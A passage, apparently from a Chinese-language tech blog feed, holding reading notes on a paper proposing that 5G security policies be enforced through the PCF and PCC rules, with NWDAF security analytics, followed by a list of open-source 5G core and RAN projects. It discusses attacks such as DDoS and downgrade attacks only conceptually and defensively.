applicable)的靜態策略</p><p>問題是這種靜態方法對於之後的的用例是否仍然有效，其中訂閱計劃可能與安全增值服務和相應的租戶（例如關鍵基礎設施的所有者）需要不同級別的安全（例如每個切片）和對安全事件作出反應的能力</p><p>這些use case需要彈性、可擴展和動態的策略管理以及設定<br>此外，security enforcement只是指示是否要在NG-RAN網路區域應用UP完整性與機密性保護，並僅適用於3GPP類型的存取</p><p>UP Security Enforcement 從NG-RAN擴展到傳輸以及核網會是個挑戰<br>(即PDU會話提供的整體連接的end to end security enforcement方法 會是個挑戰)</p><p><img src="https://i.imgur.com/7xtxVnm.png"><br>圖2顯示了當前UP security enforcement以及注意事項</p><p><img src="https://i.imgur.com/JwXF00a.png"></p><p>一旦PDU Session建立，<br>當前Session的特徵(即PDU會話資訊)僅限於一些主要與QoS相關的資訊元素(例如:QoS Flow ID,Reflective QoS Indicator)<br>當發生了PDU層級的安全事件，並沒有觸發緩解措施的安全屬性<br>例如，當應用程式處理被歸類為機密的資料時在UE與Data Network之間的PDU Session內會需要特別的安全措施，像是DRB所支援服務中所使用的強加密演算法或更長的加密金鑰</p><blockquote><p>在 3.25章節開發了一個框架，為PDU層級的安全事件提供安全屬性</p></blockquote><h3 id="2-3-Challenges-to-fine-security-policies-under-policy-control-framework"><a href="#2-3-Challenges-to-fine-security-policies-under-policy-control-framework" class="headerlink" title="2.3 Challenges to fine security policies under policy control framework"></a>2.3 Challenges to fine security policies under policy control framework</h3><p>雖然為每個訂閱定義安全策略很費力，但這與為QoS進行此操作似乎沒甚麼不同<br>可以預期，安全策略與QoS測並非真正獨立，而是相同策略可被應用在大量訂閱 e.g.per slice</p><p><strong>Policy and Charging Control rule (PCC rule)</strong> 包含啟用用戶面偵測、策略控制、對於服務資料流的適當計費所需的資訊</p><p>兩種PCC rules存在:動態與預定義規則<br>動態規則由PCF提供給SMF，而預定義PCC規則則是被設定至SMF</p><p>當動態規則與預先定義的PCC規則有相同優先級，則動態規則優先<br>這些policies的目標是:</p><ul><li>PDU sessions</li><li>Service Data Flows (SDF). Set of PDUs (within PDU session) identidied by traffic filters</li></ul><p>PCF Control是否應用於PDU Session是由SMF策略基於DNN或每個切片去定義的<br>若沒有PCF Cnotrol，則本地基於策略的rule會在SMF被設定</p><p>PCC rule 定義包含:</p><ul><li>Sevice data flow detection mechanism  (ex. filters, application template)</li><li>Charging releated Information Elements(IEs) </li><li>Policy control related IEs  (ex. Gating, QoS, bit rates…etc)</li></ul><p>service data flow filter 包含用於匹配IP PDU流量以及Ethernet PDU流量的用戶平面資料<br>SMF應用啟用的PCC規則內的Service data flow template information來指示UPF去識別屬於特定<br>service flow的封包</p><p><span class="special">作為一個PCC規則一部分的安全資訊元素的適當定義會是一個關鍵挑戰</span></p><p>目前 <strong>3GPP TS 23.503: Technical Specification Policy and Charging Control Frameworkfor the 5G System</strong> 所定義的PCC Rules不明確包含此類參數，也不作為能夠識別安全事件的服務資料流偵測的一部分，或者做為策略控制操作的一部分。 此外，SMF發送有關PDU Session狀態(e.g. 存取類型、漫遊、IP位址等等)的PCF資訊，因此PCF可以基於特定觸發器做出動態反應從而相應變更策略，所以安全觸發器的定義非常重要，因為它不僅會影響網絡的安全狀態，還會影響網絡的整體 QoS 和 SLA（例如 DDoS 攻擊），然而去創造這些安全觸發器(例如，最近發現的安全漏洞、詐欺、攻擊、違規存取等等)會是挑戰，在UPF或其他特定安全探測器(security probe)中設定一部分偵測過濾器(detection filter)，其策略目標是將安全保證(security assurance)層面包含進網路整體的服務保證中。</p><p><span class="special">⚠️目前問題則是，如何使安全性成為 PCF 的 PCC 決策過程的一部分？</span><br>本篇論文在3.3章節提供解答</p><h3 id="2-4-Challenges-to-introduce-security-use-cases-under-network-analytics"><a href="#2-4-Challenges-to-introduce-security-use-cases-under-network-analytics" class="headerlink" title="2.4 Challenges to introduce security use cases under network analytics"></a>2.4 Challenges to introduce security use cases under network analytics</h3><p><strong>Network Data Analytics function (NWADF)</strong> 作為SBA架構出現在Release 15</p><p>可以有多個專門用於不同類型分析的 NWDAF，由分析 ID 訊息元素 (IE) 標識。此 IE 用於識別 NWDAF 可以生成的受支持分析的類型。 NWDAF 出於不同目的與不同實體進行交互，例如基於訂閱不同網絡功能提供的事件的數據收集、從數據存儲庫和 NF 檢索訊息，以及向不同類型的消費者按需提供分析，目前NWADF的資料蒐集功能僅允許從控制平面來源為切片或UE獲取資料，但目前如何從UPF蒐集有關用戶平面安全資料尚未標準化，這實際上目前僅限於流量和數據速率。</p><p><strong>OAM(Operation,Administration and Management)</strong> 系統僅測量與追蹤資料，這些資料可通過Management Service 共享給NWADF</p><p>出於安全分析目的，從用戶平面流量分析中收集的有關惡意軟體、殭屍網絡、協定異常等的資訊，例如通過 [18] 提出的安全探測器（例如嵌入 UPF 中的 IDS）或惡意軟件沙箱，將非常有用通過新的安全用例增強網絡分析。</p><p>這些分析資訊環繞網路切片的負載水平、服務體驗、網路效能、移動性、QoS、UE行為等等<br>提供了有價值的知識基礎</p><p>本文範圍中有三個基本問題被提出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 如何從所分析知識的基礎上取得安全性相關的資訊?</span><br><span class="line">- 在NWADF中可監控和進一步分析哪些特定的新安全參數?</span><br><span class="line">- 在end to end 5G架構中PCF，要如何利用這些資訊來設定並執行安全策略?</span><br></pre></td></tr></table></figure><h2 id="3-Proposed-approach-to-security-enforcement-in-5G"><a href="#3-Proposed-approach-to-security-enforcement-in-5G" class="headerlink" title="3. Proposed approach to security enforcement in 5G"></a>3. Proposed approach to security enforcement in 5G</h2><p>從實施角度來看，到目前為止，行動網絡中安全策略和 QoS 參數的實現在網絡中存在很大差異</p><p>5G PCF是一個單一框架用來定義任何類型的策略並將其遞交給其他控制平面上的NF</p><p>從不久的將來角度來看，當租戶要求的訂閱計畫(Subscription Plan)將需要包含安全條款時，即安全性作為SLA的重要組成部分，就像當今的QoS一樣，我們提出了新的security enforcement方式利用了統一策略控制模型</p><h3 id="3-1-Application-of-QoS-policies-to-security-use-cases"><a href="#3-1-Application-of-QoS-policies-to-security-use-cases" class="headerlink" title="3.1 Application of QoS policies to security use cases"></a>3.1 Application of QoS policies to security use cases</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- session-AMBR</span><br><span class="line">- UE-AMBR</span><br></pre></td></tr></table></figure><p>我們的提案是，這些 QoS 策略可以在接收安全事件或事件時從 PCF 受限制地和動態地應用到網絡中，這些安全事件可以在 NWDAF 或用戶平面的其他安全分析平台（例如，放置在管理平面中的 SIEM 工具，嵌入在 UPF 中的 IDS 系統等）中建立</p><p>基於預定義的安全指標，可以從 PCF 執行不同的策略，實際上作為網絡中的有效緩解機制：</p><ul><li>設定新的session AMBR</li><li>設定新的UE AMBR，這將會是一種對於UE的隔離 (例如，UE是作為DDoS攻擊的active bot)</li><li>在QoS Profile內使用更嚴格的安全控制以設定新的PDU Session</li></ul><p>QoS profiles 可在5G AN中由SMF動態建立；可以透過來自SMF的N1介面上的會話管理信令或直接在N4介面上的UPF上對UE實施特定的QoS規則</p><p>N1介面: UE $\leftrightarrow$ AMF<br>N4介面: SMF $\leftrightarrow$ UPF 用以在用戶平面中管理資料會話<br>N4基於PFCP協定(Packet Forwarding Control Protocol)</p><p>SMF 確實通過規則管理 QoS 流，將流量過濾器與來自 PCF 的 QoS 策略相關聯。<br>流量過濾器集在 UPF 中配置，可用於輕鬆管理安全服務。例如：</p><ul><li>由具有特殊安全要求（例如加密演算法、密鑰長度等）的特定一組UE或切片的特定安全參數index標識出的安全關聯</li><li>像是交通控制之類的偵測與動態QoS 規則可以被動態應用</li></ul><p>下面流程圖描繪了應用安全規則作為在網路中QoS策略的一部分概念:<br><img src="https://i.imgur.com/3514RyB.png"></p><p>下圖為透過以上概念實現的安全呼叫步驟<br><img src="https://i.imgur.com/1t07hXz.png"></p><p><em>1.a</em> <span class="special"><strong>NWDAF → PCF</strong></span><br>PCF訂閱了NWDAF通知<br>由於網路安全事件(ex. DDoS)，我們發現了使用者資料擁塞的情況，該情況透過N23介面傳送給了PCF</p><p><em>1.b</em> <span class="special"><strong>Security Management → PCF</strong></span><br>安全管理系統通過REST API與PCF整合而成<br>安全事件被報告給PCF</p><p><em>1.c</em> <span class="special"><strong>PCF → UDR(optional)</strong></span><br>PCF藉由N36介面向UDR請求一組資料<br>在此用例中，請求資料可以是訂閱策略集的安全策略部分的ID，以在發生安全事件時應用。</p><p><em>2.</em> <span class="special"><strong>PCF → SMF</strong></span><br>當PCF做出策略決定後，PCF則確定SMF需要更新策略資訊以緩解安全問題，並藉由N7介面發送一個<br><strong>Npcf_SMPolicyControl_UpdateNotify</strong> 請求其中包含關於PDU Session的更新策略資訊，在這種情況下建立新的 Session AMBR</p><p><em>3.</em> <span class="special"><strong>SMF → PCF</strong></span><br>SMF回應PCF一個ACK</p><p><em>4.a</em> <span class="special"><strong>SMF → UPF</strong></span><br>基於SMF所發送的QoS Emforcement Rule的QoS enforcement是一個由UPF提供的功能<br>包含通過N4介面對Session AMBR (Step2 從SMF接收來自PCF)</p><p><em>4.b</em> <span class="special"><strong>SMF → UE</strong></span><br>藉由AMF與UE交換N1 SM信令，來提供UE QoS規則<br>e.g. 設定新的UE-AMBR 來限制在UE所有PDU Session中所有Non-GBR QoS Flow所被預期可提供的最高Bit rate</p><p><em>4.c</em>  <span class="special"><strong>SMF → 5G AN</strong></span><br>藉由AMF與5G-RAN交換N2 SM信令，以設定5G RAN的QoS參數<br>e.g. 為特定類型的流量預留資源</p><h3 id="3-2-User-plane-security-enforcement-and-assurance"><a href="#3-2-User-plane-security-enforcement-and-assurance" class="headerlink" title="3.2. User plane security enforcement and assurance"></a>3.2. User plane security enforcement and assurance</h3><p>在UP 流量上實現安全策略的方式是一樣是基於策略控制</p><p>直接作用於AMF、SMF等控制NF，而PCF應到達UE、RAN和UPF以直接在UP上應用這些策略</p><h4 id="3-2-1-Security-policies-enforcement-via-AMF"><a href="#3-2-1-Security-policies-enforcement-via-AMF" class="headerlink" title="3.2.1. Security policies enforcement via AMF"></a>3.2.1. Security policies enforcement via AMF</h4><p><img src="https://i.imgur.com/MfoI2Au.png"></p><p>有兩種類別的策略是為了<strong>存取</strong>與<strong>移動性管理</strong><br>它們被AMF執行、由PCF規定並儲存在UDR中<br>它們可以支持安全用例，而無需對策略定義進行重大更改：</p><ul><li><p>Policies transfered from PCF to AMF:</p><ul><li>Service area restrications<br>  <strong>Tracking Area</strong> 是一種區域上的邏輯概念，使用者可在其中移動而無須更新管理節點，網路會分配一個或多個TAs到使用者上<br>  而Service area restrication包含<strong>允許區域</strong>與<strong>非允許區域</strong><br>  本篇論文提出，使用特定閥值為不同服務區域建立安全等級，來決定使用者是否有權移動到高安全服務區域<br>  舉例: 地理上的敏感地區，像是關鍵基礎設施可能會限制對使用 <strong>“Null Schema”</strong> 來產生SUCI的使用者的存取，以防止像是惡意基地台的影響，換句話說可能會允許支援UP完整性保護的使用者存取<br>  <img src="https://i.imgur.com/EXWGDgX.png"></li><li>Priorities of area types the user may use<br>  適當的優先權定義可避免<strong>降級攻擊</strong>，迫使UE連接到更多脆弱性的網路(像是2G)，比起4G、5G網路來說更容易遭受攻擊，攻擊者可以通過使 UE 和網絡實體分別相信對方不支持安全功能來嘗試降級攻擊，即使雙方實際上都支持該安全功能<br>  <img src="https://i.imgur.com/8nbzQWr.png"><br>  <strong>Anti-Bidding down Architecture</strong> 在Release 15中已經定義，但目前並為真正生效，因為它的目的是在於防止從未來的增強安全功能降低到當前的安全功能<br>  <img src="https://i.imgur.com/PC8zo8N.png"></li></ul></li><li><p>Policies transferred from PCF to the UE via AMF</p><ul><li>User Equipment Route Selection Policy to determine how to route egress traffic(PDU selection policies)<br>  當安全事件發生時可能會觸發新的PDU Session(e.g. 在UE中的惡意程式偵測)i.e.<br>  一種在data path上具有特殊策略的<strong>隔離</strong> PDU，甚至是在具有特殊安全服務的安全DN中終止的PDU</li></ul></li></ul><p><span class="special">LADN(Local Area Data Network)的概念在5G中用於支援MEC，並支援上述措施的實踐。LADN對僅授權在某一組位置(被稱為<strong>LADN Services Areas</strong>)中的PDU Session中實施限制。</span></p><p><span class="special">LADN services Areas 在AMF中基於每個DNN去進行設定，而AMF會提供UE LADN Service Areas的資訊</span></p><h4 id="3-2-2-Security-policies-enforcement-via-SMF"><a href="#3-2-2-Security-policies-enforcement-via-SMF" class="headerlink" title="3.2.2. Security policies enforcement via SMF"></a>3.2.2. Security policies enforcement via SMF</h4><blockquote><p>SMF 功能介紹 : SMF負責控制一個PDU Session所需的信令(通過N4信令)，並設定這個PDU Session中的用戶平面處理(支援PDU Session的用戶平面功能(UPF)的選擇)</p></blockquote><p>因此SMF控制了UPF所支援的功能，包含安全相關的功能像是，防火牆、節省流量、DDoS保護、GPRS Tunneling Protocol(GTP)、(新的Inter PLMN UP Security in Release16)等等功能</p><p>此外它還控制策略執行(policies enforcement)，即與PCF互動來獲得策略，並將其直接應用到UPF(via N4)或藉由AMF應用到NG-RAN網路中的其他部分.</p><blockquote><p>Proposal: 提議是被嵌入到UPF的安全控制可通過PCF中的安全策略進行管理</p></blockquote><p>此外，這個新概念將使air interface中的用戶平面安全實施策略（機密性和完整性保護）在 PCF 中管理（而不是像今天一樣在 SMF 中本地配置），而它們是來自UDR(作為具有預定義安全策略的策略設定文件的儲存)</p><p>因此，這些策略應要是專用於用戶平面安全的Dynamic PCC rules的一部分，並可能擴展到其他的domain或UP介面，像是:<br>N6: UPF $\leftrightarrow$ Data Network， 基於IP或Ethernet傳輸<br>N3: UPF $\leftrightarrow$ 5G-RAN，基於GTPv1-U(GPRS Tunneling Protocol User Plane)<br>N9: UPF $\leftrightarrow$ UPF，用以傳輸用戶平面資料，基於GTPv1-U</p><h4 id="3-2-3-UP-security-enforcement-use-cases"><a href="#3-2-3-UP-security-enforcement-use-cases" class="headerlink" title="3.2.3. UP security enforcement use cases"></a>3.2.3. UP security enforcement use cases</h4><p>用於 5G 概念的 N6-LAN 應允許 PCF 設定 UPF 以實現安全服務功能鏈到數據網絡<br><img src="https://i.imgur.com/ZkrVdFk.png"></p><blockquote><p> N3 介面保護機制:  TS33.501 表明在N3(UPF $\leftrightarrow$ RAN)進行資料傳輸應具備機密性、完整性、重放攻擊保護。所需機制是IPSec ESP和 IKEv2 基於憑證的授權機制，然而使用哪種密碼學機制來保護N3是取決於營運商的決定</p></blockquote><p>在不久的將來，可以根據提供給一組用戶、切片和&#x2F;或租戶的安全級別選擇性地部署這些類型的解決方案，具體取決於服務或基礎設施的要求和重要性</p><p>舉例來說:<br>例如，服務於關鍵基礎設施（例如公用事業）的專用網絡，或車載自組織網絡（VANET），當然需要對無線基地台和核網之間的通訊進行全面保護</p><blockquote><p>Proposal :  本篇論文的提議是；將用於N3的加密解決方案包含進PCC規則中，並強制執行於gNB(via AMF)和UPF系統中的安全閘道器之中(via SMF)強制執行應建立新的IPSec Tunnel或將 PDU 分配給現有的 IPSec Tunnel</p></blockquote><p>同樣的概念也可應用於N9上一些用例所使用的安全方式，像是不同營運商之間互相連接。這種情況下 GTP檢查以及IPSec已被標準化，但不是作為一個”安全的SLA”的一部分通過PCF執行的，此外，通過新的分析功能（如 NWDAF）或資料庫（如UDSF,Unstructed Data Storage Function）來儲存session資料或從 UPF 或其他特定安全分析平台（可以關聯來自多個來源的事件）接收的安全事件，PCF 可以對查詢 UDR 的既定安全服務級別協議(Security SLA,SSLA)中的更改做出反應，應用新的安全策略，強制建立新的更安全的 PDU，即緩解觸發操作的安全問題</p><p><img src="https://i.imgur.com/8ZkUC6D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ex:</span><br><span class="line">在某個區域網絡中檢測到假基站</span><br><span class="line">或者簡單地從安全的角度來看某個關鍵區域（例如機場、關鍵基礎設施站點等），</span><br><span class="line">PCF 將對該網絡地理區域中的基站所附的相關 UE/UE 組實施完整性保護。其他約束也可以構建有效的用例（例如，連接到關鍵切片的 UE）。 UE 的策略應從“不需要”更新為“首選”或“需要”</span><br></pre></td></tr></table></figure><p>下圖為PDU Session 建立的流程，以粗體顯示本論文要執行call<br>以提供所描述的來自 PCF 的安全策略的動態實施</p><p><img src="https://i.imgur.com/pFT8Zpv.png"></p><h3 id="3-2-4-Security-assurance"><a href="#3-2-4-Security-assurance" class="headerlink" title="3.2.4. Security assurance"></a>3.2.4. Security assurance</h3><p>一旦使用安全屬性（例如特定服務流的加密、完整性保護、訪問控制策略等）建立 PDU 會話，允許在網絡中進行擴展意義上的安全實施，仍有兩個關鍵方面值得關注可以考慮，即安全資料收集和cloased-loop automation，為了介紹它們，使用了Chargin Function(CHF)做為類比</p><p><img src="https://i.imgur.com/SAtlROD.png"></p><p>使用資料收集可用於計費、收集統計數據和監控整體網絡使用情況和 UE 行為。<br>當使用者超出某些閥值後(ex.花費額度限制)CHF會告知PCF，而PCF會將此考慮進動態應用相關策略至user session e.g. 給定PDU Session的QoS限制、重新導向到營運商網頁等等</p><blockquote><p>Proposal: 使用來自UPF中的嵌入式安全功能的安全相關資料來增強&#x2F;豐富資料收集</p></blockquote><p>SMF負責從UPF收集增強&#x2F;豐富資料並傳送到<strong>中央安全管理系統</strong> (儲存資料，並將其與網路中各種安全專用平台所蒐集的安全資訊做相互關聯) e.g. 防火牆log、Security telemetry、IDS Log等等</p><p>安全管理系統要負責創造安全事件，並在 PCF 和&#x2F;或 SMF 上觸發操作<br>e.g. 通知 PCF 某些安全 SLA 已被越過，將用戶流量重新導向到例如清理中心或專用安全 DN 等。</p><p>在 5G 中 UPF 在 4G Evolved Packet Core 中承擔流量檢測功能的角色，即封包檢測（例如基於業務數據流的應用檢測），因此它可以執行 PCF 策略。事實上，實現 UPF 的技術集成了越來越多的安全功能，如防火牆或運營商級網絡地址轉換。</p><p>5G 核心允許 PCF 在發送到 UE 的連接相關策略和發送到網絡的策略之間進行協調，這些策略可以部署在用戶平面的 UPF 中，例如嵌入在 UPF 中的 L7 防火牆中的安全策略，用於針對特定用戶的特定服務。以下兩個用例說明了這個概念：</p><h3 id="use-case1"><a href="#use-case1" class="headerlink" title="use case1"></a>use case1</h3><p>根據3GPP TS 23.503，PCF支援的用於PDU Session的SMF 選擇管理(Selection Management)的功能之一是，向AMF提供策略以通知PCF去針對特定DNN執行DNN replacement，此類replacement操作的觸發器，可能是由於安全事件而受損的DNN，由於特定DN或切片過載(ex. DDoS)，而通過NWADF報告給PCF</p><h3 id="use-case2"><a href="#use-case2" class="headerlink" title="use case2"></a>use case2</h3><p>當 SMF 收到 PCC 規則時，SMF 可以採取措施重新設定 PDU 的 UP。這些行動之一可以是使用新的指導規則來更新UPF，例如將某些可疑流量轉發到本地資料中心(Ex. MEC)，目的是在網路中的小型受控區域內遏制潛在的安全漏洞</p><p>MEC 的概念是促進 UPF 在網絡邊緣的部署，更靠近 UE，有時用於關鍵應用程序<br>e.g. Ultra Low Level latency use case、快取、體育場館等</p><p>作為對事件的響應(response)，應用功能(Application Function,AF)可以向5G核網(i.e PCF or via Network Exposure Function(NEF))發出請求，已將一組UE甚至整個切片的流量引導至位於邊緣的UPF，可以部署 DDoS 保護、清洗中心、IDS&#x2F;IPS 等安全功能作為遏制機制。</p><blockquote><p>AF功能: AFs與3GPP 核網互動，以提供服務:像是應用程式對流量路由的影響、存取NEF、與策略框架互動(藉由N5)等等 i.e. 它請求動態策略<br>如今，AF 作為 MEC 調度應用程式或 IP Multimedia System (IMS)。</p></blockquote><blockquote><p>Proposal: 將 AF 的範圍擴展到安全應用：</p></blockquote><ul><li>對於流量路由(traffic routing)的影響作為安全緩解機制<br>舉例:測到攻擊（例如 DDoS）時的 BGP Injection 和路由變更</li><li>藉由NEF存取5G核網<br>舉例:提供威脅情報源的第三方安全公司</li><li>與策略框架的互動<br>舉例: 由於不可預測的安全事件或由於新的威脅簽名而提供新的 SDF 過濾規則的策略變更</li></ul><h3 id="3-3-Establishing-security-policies-as-part-of-PCC-rules"><a href="#3-3-Establishing-security-policies-as-part-of-PCC-rules" class="headerlink" title="3.3. Establishing security policies as part of PCC rules"></a>3.3. Establishing security policies as part of PCC rules</h3><p>PCC規則將 <strong>SDF模板</strong>(服務資料filter的列表或應用程式filter的應用程式ID)<br>以及對流量的可能操作(策略實施)連接起來</p><p>以 3GPP 提出的當前行動為基礎，專注於純粹的QoS actions，我們建議出於安全目的擴展和應用這些actions，並歸納成表 1</p><p><img src="https://i.imgur.com/gXZeTff.png"></p><p>3GPP TS 23.503的6.3.1表格列出了PCC規則中包含的資訊，像是資訊名稱(information name)<br>、描述(description)、以及PCC是否可在SMF內被啟用的Dynamic PCC規則之中修改此資訊</p><p>表2 顯示 TS 23.503的6.3.1表格的摘錄<br><img src="https://i.imgur.com/a7jUM1v.png"><br>表格中的灰色區域顯示了在原標準上增添的元素</p><p>在”Security”類別中，有兩項Information Elements，這兩項元素涉及目前在用戶平面中存在的安全策略，但目前僅在SMF中進行本地管理且僅限於Access Network(AN)<br>我們的貢獻是使它們成為 PCC 規則結構的一部分：</p><ul><li><p>以PDU的層級來看，PCF 還可以控制 PDU Session的不同參數，其中包括 SMF 從 PDU Session中獲取新策略的條件（策略控制請求的觸發器），而這些條件對於定義安全用例十分重要 i.e.<br>若這些條件是安全觸發器(e.g.意外事件、過載、超出閥值等)，則PCC 安全規則將從 PCF 傳達到 SMF，並在 UPF 和&#x2F;或 5G-RAN中執行。</p></li><li><p>PDU Session相關策略資訊的目的是提供分別適用於單個監控金鑰匙或整個PDU Session的PCC(Policy and charging control)，PCF 可以將 PDU 會話相關的策略訊息與 PCC 規則一起或單獨提供給 SMF</p></li></ul><p>TS 23.503的6.4-1表格包含了PDU Session相關的策略資訊<br>表3 顯示 TS 23.503的6.4-1表格的摘錄，重點關注使用監控控制相關訊息，其中提出了兩個新的監控密鑰用於 (D)DoS 攻擊檢測。<br><img src="https://i.imgur.com/B6DC660.png"></p><p><span class="special">最後，PCF 還應指示 SMF 檢測哪些應用程序。在收到來自 SMF 的報告後，PCF 可以做出策略決定並向 SMF 發送更新的或新的 PCC 規則。如果網絡中的特定安全分析能夠定義攻擊，則應將相同的過程應用於安全 (e.g. 在bot 與 C&amp;C中心之間的通訊)或特徵化安全事件概況 (e.g. 意圖在通訊中使用指定協議的無效port來破壞存取控制防火牆規則 )</span><br>因此，可以像任何其他應用程序簽名一樣創建安全簽名，並應用相應的 PCC 規則。</p><h3 id="3-4-Security-analytics-implemented-in-NWDAF"><a href="#3-4-Security-analytics-implemented-in-NWDAF" class="headerlink" title="3.4. Security analytics implemented in NWDAF"></a>3.4. Security analytics implemented in NWDAF</h3><p><img src="https://i.imgur.com/pp10sLI.png"></p><p>NWDAF 提供的訊息可以對 PCF 執行的 PCC 決策過程做出重大貢獻</p><p>然而，分析訊息目前僅限於切片特定的網絡狀態，例如負載級別訊息。即，不需要知道使用切片的訂戶，但它在網絡切片級別工作</p><blockquote><p>Proposal: 擴展負載級別訊息，添加安全上下文訊息（例如事件、攻擊、漏洞等）</p></blockquote><p>它需要將單獨實施的安全功能或作為標準化網絡功能的一部分（例如具有嵌入式防火牆功能的 UPF）提供給 NWDAF 或中間專用安全分析平台。</p><p>標準 TS 23.288 [11] 為不同類型的 NWDAF 提供了可能性，專門用於不同類型的分析，由Analytics ID Information Element 所標識。</p><p>PCF 可以通過 N23 接口使用此訊息。其中一些訊息已經可以為安全分析和進一步實施提供非常有用的訊息，如前幾節所述。</p><p>[11] 的表 7.1-2 顯示了 NWDAF 服務提供的分析訊息。我們在此表中添加了一列，其中包含可能被提取到其他安全分析功能以進行進一步分析或直接提取到 PCF 框架以應用特定安全 PCC 規則的安全資訊（參見表 4）。</p><p><img src="https://i.imgur.com/URrNthl.png"></p><p>安全分析特別有趣的是 NWDAF 捕獲的與異常行為相關的網絡數據分析。</p><p>PCF 可以使用 <strong>Nnwdaf_AnalyticsSubscription_Subscribe</strong> 服務操作去訂閱與 “異常行為” 相關的網絡分析通知，目的是預測和檢測安全問題、觸發新的安全策略或更新特定 UE 或 UE 組的現有安全策略。 該封包括Analytics ID（”Abnormal behaviour”）、分析報告目標<strong>SUPI</strong>、<strong>Internal Group ID</strong> 和分析過濾器(filter)，包括異常 ID 列表和每個異常 ID 的可能閾值</p><p>前的異常 ID 列表在 [11] 中指定，例如“意外的 UE 位置”、“懷疑 DDoS 攻擊”、“錯誤的目標地址”等。標準的表 6.7.5.3-3 提供了減輕風險的策略和行動示例，例如“擴展服務區限制”、“釋放 PDU 會話”、“更新封包過濾器&#x2F;QoS”等。</p><p>如本文檔第 2.4 節所述，挑戰在於，在用戶平面級別，每個應用程序的通信描述僅限於該通信的流量和數據速率，與體積類型的攻擊（例如氾濫、過載、DoS 等）。</p><p>統計或預測中的變化或異常，例如 UE 通信的周期、通信持續時間或某些流量特徵（例如異常端口、可疑 DNN、其他有用訊息等）、上傳&#x2F;下載量（平均值和方差） ) 可能表示安全事件或事故。</p><p>在用戶平面層面，新提案包括，除了數量、變化和異常之外，NWDAF 可以直接從 UPF 收集真實的安全事件（事實），這要歸功於附加或嵌入其中的用戶平面安全檢查功能。此安全訊息可能會被 PCF 等活動 NF 使用，以動態更新 UE 組中特定 UE 的 PCC 規則、更改 PDU 或什至在需要時在切片級別採取行動</p><h2 id="4-Future-work"><a href="#4-Future-work" class="headerlink" title="4. Future work"></a>4. Future work</h2><p>基於本論文提出的Security Enforcement的原則，有三個領域可以進一步去研究</p><ul><li>specific security analytics supported by machine learning algorithms</li><li>roaming scenarios, including local break out</li><li>applicability to IoT use cases</li></ul><h2 id="5-Conclusion"><a href="#5-Conclusion" class="headerlink" title="5. Conclusion"></a>5. Conclusion</h2><p><img src="https://i.imgur.com/VkTuInH.png"></p><h2 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h2><p><a href="https://www.sciencedirect.com/science/article/pii/S0140366421001262">https://www.sciencedirect.com/science/article/pii/S0140366421001262</a></p><p>meeting簡報: <a href="https://drive.google.com/file/d/1RK6R5yjRuvS-BhdTjZPhOXAg9ghlW2O6/view?usp=sharing">https://drive.google.com/file/d/1RK6R5yjRuvS-BhdTjZPhOXAg9ghlW2O6/view?usp=sharing</a></p>]]></content>
      
      
      <categories>
          
          <category> 論文導讀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Security Policy </tag>
            
            <tag> 3GPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪筆記-5G開源資源整理</title>
      <link href="/posts/dd26b396.html"/>
      <url>/posts/dd26b396.html</url>
      
        <content type="html"><![CDATA[<h2 id="架構"><a href="#架構" class="headerlink" title="架構:"></a>架構:</h2><p><img src="https://i.imgur.com/XyqAjzZ.png"></p><p><img src="https://i.imgur.com/3DQV6fW.png"></p><h2 id="開源專案"><a href="#開源專案" class="headerlink" title="開源專案"></a>開源專案</h2><ul><li>Open5GS - Open5GS contains a series of software components and network functions that implement the 4G&#x2F; 5G NSA and 5G SA core functions.<br><a href="https://github.com/open5gs/open5gs">https://github.com/open5gs/open5gs</a></li><li>open5gs + oai config :<a href="https://github.com/s5uishida/open5gs_epc_oai_sample_config">https://github.com/s5uishida/open5gs_epc_oai_sample_config</a><br>open5gs 有實作4G EPC 與 5G 5GC，因此以組網方案來說，option3、option7、option4可能都是可行的 </li><li>dockerlized Open5GS<br><a href="https://github.com/herlesupreeth/docker_open5gs">https://github.com/herlesupreeth/docker_open5gs</a></li><li>Softwarization of 5G System<br><a href="https://github.com/LABORA-INF-UFG/NetSoft2020-Tutorial4">https://github.com/LABORA-INF-UFG/NetSoft2020-Tutorial4</a></li><li>free5GC - Open Source 5G core network<br><a href="https://github.com/free5gc/free5gc/wiki">https://github.com/free5gc/free5gc/wiki</a></li><li>C-RAN 介紹<br><a href="https://www.ufispace.com/company/blog/what-is-cran-the-evolution-from-dran-to-cran">https://www.ufispace.com/company/blog/what-is-cran-the-evolution-from-dran-to-cran</a></li><li>UERANSIM  - is the open-source state-of-the-art 5G UE and RAN (gNodeB)<br><a href="https://github.com/aligungr/UERANSIM">https://github.com/aligungr/UERANSIM</a><br>好像有實作檔案，但是好像是用來測核網的，而且也還沒有符合O-RAN架構</li><li>Awesome 5G - 列出各種5G開源專案<br><a href="https://github.com/calee0219/awesome-5g">https://github.com/calee0219/awesome-5g</a></li><li>free5GRAN - 開源5G RAN架構 (以SA作為組網架構)<br><a href="https://github.com/free5G/free5GRAN">https://github.com/free5G/free5GRAN</a></li><li>O-RAN OSC<br><a href="https://github.com/o-ran-sc?language=c">https://github.com/o-ran-sc?language=c</a></li><li>OAI -Open Air Interface 5G<br><a href="https://gitlab.eurecom.fr/oai/openairinterface5g/-/wikis/home">https://gitlab.eurecom.fr/oai/openairinterface5g/-/wikis/home</a></li><li>OAI 5G NSA 搭建教學: <a href="https://blog.csdn.net/BUPTOctopus/article/details/107717942">https://blog.csdn.net/BUPTOctopus/article/details/107717942</a></li></ul><h2 id="O-RAN-Components"><a href="#O-RAN-Components" class="headerlink" title="O-RAN Components"></a>O-RAN Components</h2><p>OSC 釋出各component 下載<br><a href="https://wiki.o-ran-sc.org/pages/viewpage.action?pageId=20876303">https://wiki.o-ran-sc.org/pages/viewpage.action?pageId=20876303</a></p><p>O-RAM Developer Wiki - 裡面有部屬教學<br><a 